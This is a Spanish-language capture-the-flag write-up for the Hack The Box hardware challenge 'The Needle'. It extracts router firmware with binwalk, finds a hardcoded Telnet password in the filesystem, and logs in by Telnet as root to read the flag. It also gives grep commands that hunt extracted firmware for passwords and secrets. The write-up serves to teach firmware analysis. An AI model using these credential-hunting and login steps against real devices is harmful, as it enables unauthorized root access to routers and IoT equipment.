---
title: "The Needle"
description: "Writeup de The Needle - Hack The Box - Hardware 130pts. Firmware de router Linux ARM (zImage, big-endian ARMv5); binwalk extrae squashfs; grep en los scripts revela telnetd usando una variable $sign como contraseña; el archivo sign contiene la credencial en texto plano."
sidebar:
  badge:
    text: Hardware
    variant: tip
tags:
  - htb
  - hardware
  - firmware
  - binwalk
  - squashfs
  - telnet
  - arm
  - embedded-linux
  - iot
---

# The Needle

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Hardware
> 🏆 Puntos: 130
> 👤 Autor: warrior866

---

## Descripción

El ZIP contiene `firmware.bin`, un ejecutable Linux ARM de tipo zImage (boot comprimido, big-endian, ARMv5). Este es el firmware de un router o dispositivo IoT embebido. Con `binwalk` se extrae el sistema de archivos squashfs del firmware. Explorando los scripts de inicialización se encuentra `telnetd.sh`, que arranca un daemon Telnet usando la variable de entorno `$sign` como contraseña. El archivo `/etc/config/sign` contiene la contraseña en texto plano. Con esta credencial se puede hacer login por Telnet en el servidor del reto y leer la flag.

---

## Extracción y análisis inicial

```bash
unzip -P 'hackthebox' a12c73b9-1b36-48e0-b2c7-e7f3e3b92a17.zip -d "the-needle"
cd the-needle

file firmware.bin
# firmware.bin: Linux kernel ARM boot executable zImage
#               (big-endian), version "2.6.36 (...)"
#               ARMv5 Architecture 5TE
```

El formato `zImage` es el kernel de Linux comprimido para arquitectura ARM embebida. Los routers y dispositivos IoT suelen usar imágenes de firmware que contienen: el bootloader, el kernel Linux, y el sistema de archivos raíz (squashfs, jffs2, cramfs).

---

## Extracción del sistema de archivos con binwalk

```bash
binwalk -e firmware.bin
```

```
DECIMAL      HEX          DESCRIPTION
------------ ------------ ---------------------
0            0x0          uImage header (CRC, timestamp, etc.)
14640        0x3930       gzip compressed data
1070080      0x105400     Squashfs filesystem, little endian
                          version 4.0, 2.8 MB, 396 inodes
```

```bash
ls _firmware.bin.extracted/
# squashfs-root/
# squashfs-root-0/   ← sistema de archivos principal
# squashfs-root-1/
```

binwalk extrae automáticamente los filesystems embebidos. El directorio con más contenido es `squashfs-root-0/`.

---

## Exploración del sistema de archivos extraído

```bash
ls squashfs-root-0/
# bin/  dev/  etc/  lib/  mnt/  proc/  sbin/  tmp/  usr/  var/  www/

ls squashfs-root-0/etc/
# config/    hosts    init.d/   inittab    passwd   scripts/   shadow
```

La estructura es un sistema Linux embebido estándar. Los directorios más relevantes para encontrar la configuración de Telnet son `etc/scripts/` y `etc/config/`.

---

## Encontrando la configuración de Telnet

```bash
# Buscar referencias a 'telnet' en todos los archivos del firmware
grep -rn 'telnet' squashfs-root-0/
```

```
squashfs-root-0/etc/scripts/telnetd.sh:3: telnetd -l "/usr/sbin/login" -u Device_Admin:$sign -i $lf &
squashfs-root-0/etc/init.d/rcS:45:      /etc/scripts/telnetd.sh &
```

El script `telnetd.sh` arranca Telnet con el usuario `Device_Admin` y la contraseña almacenada en la variable `$sign`. El script se ejecuta desde el init del sistema (`rcS`).

---

## Extracción de la contraseña desde el archivo `sign`

```bash
# Encontrar el archivo que define $sign
find squashfs-root-0/ -type f -name 'sign'
# squashfs-root-0/etc/config/sign

cat squashfs-root-0/etc/config/sign
# qS6-X/n]u>fVfAt!
```

La contraseña del servicio Telnet es `qS6-X/n]u>fVfAt!`, almacenada en texto plano en el firmware. Este es un error grave de seguridad en dispositivos IoT: credenciales hardcoded que son iguales en todos los dispositivos del mismo modelo.

---

## Login por Telnet y obtención de la flag

```bash
telnet <IP_DEL_RETO> <PUERTO>
```

```
Trying <IP>...
Connected to <IP>.
Escape character is '^]'.

login: Device_Admin
Password: qS6-X/n]u>fVfAt!

Welcome to Embedded Linux

# id
uid=0(root) gid=0(root)

# cat flag.txt
HTB{FLAG}
```

El login proporciona acceso root directo — el dispositivo ejecuta Telnet como root sin ninguna separación de privilegios.

---

## Cadena de Análisis

```text
1. firmware.bin → file → zImage ARM Linux (firmware de router)
       ↓
2. binwalk -e → extrae squashfs-root-0/ (sistema de archivos completo)
       ↓
3. grep -rn 'telnet' → etc/scripts/telnetd.sh: 
       telnetd -l /usr/sbin/login -u Device_Admin:$sign -i $lf &
       ↓
4. find . -name 'sign' → etc/config/sign → "qS6-X/n]u>fVfAt!"
       ↓
5. telnet IP PORT → login Device_Admin:qS6-X/n]u>fVfAt! → cat flag.txt
```

---

## Por qué los firmwares de IoT son tan vulnerables

Los dispositivos IoT embebidos heredan malas prácticas de seguridad por razones de coste y tiempo de desarrollo:

1. **Credenciales hardcoded**: la contraseña está en texto plano en el firmware. Todos los dispositivos del mismo modelo comparten la misma contraseña de fábrica.
2. **Telnet en lugar de SSH**: Telnet transmite todo en texto plano, incluyendo contraseñas. Un atacante en la misma red puede capturar las credenciales trivialmente.
3. **Root como usuario por defecto**: el daemon Telnet corre como root y proporciona una shell root directamente, sin separación de privilegios.
4. **Sin actualizaciones automáticas**: los dispositivos IoT rara vez se parchean, por lo que las vulnerabilidades persisten durante años.

---

## Herramientas para análisis de firmware IoT

```bash
# Extraer filesystem
binwalk -e firmware.bin

# Emular el firmware (para análisis dinámico)
# firmwalker — buscar contraseñas, claves, etc.
./firmwalker.sh squashfs-root-0/

# Explorar el filesystem manualmente
find squashfs-root-0/ -type f -name "*.conf" -o -name "*.cfg" | xargs grep -l "pass\|pwd\|secret"

# Buscar binarios con credenciales hardcoded
grep -rn "password\|passwd\|secret\|key" squashfs-root-0/etc/ --include="*.sh" --include="*.conf"
```

---

## Lecciones Aprendidas

- **binwalk es el punto de entrada para firmware**: extrae automáticamente headers, kernels comprimidos, y sistemas de archivos (squashfs, jffs2, cramfs, ext2) de prácticamente cualquier firmware de router o dispositivo embebido.
- **Buscar telnetd, sshd, y ftpd primero**: los servicios de acceso remoto son el objetivo más inmediato en análisis de firmware. Sus scripts de configuración suelen referenciar archivos de contraseñas.
- **Variables de entorno como nivel extra de "seguridad"**: usar `$sign` en vez de la contraseña directa es una ilusión de seguridad — el archivo que define `$sign` está en el mismo filesystem y es igual de accesible.
- **Firmware de router = Linux real**: los routers domésticos corren Linux completo. Todo lo que funciona en Linux funciona en ellos — bash, grep, find, nc, etc.

---

## Referencias

- [binwalk — GitHub](https://github.com/ReFirmLabs/binwalk)
- [Squashfs — filesystem para embebidos](https://en.wikipedia.org/wiki/SquashFS)
- [OWASP IoT Attack Surface — Firmware](https://owasp.org/www-project-internet-of-things/)
- [HackTricks — Firmware Analysis](https://book.hacktricks.xyz/hardware-physical-access/firmware-analysis)
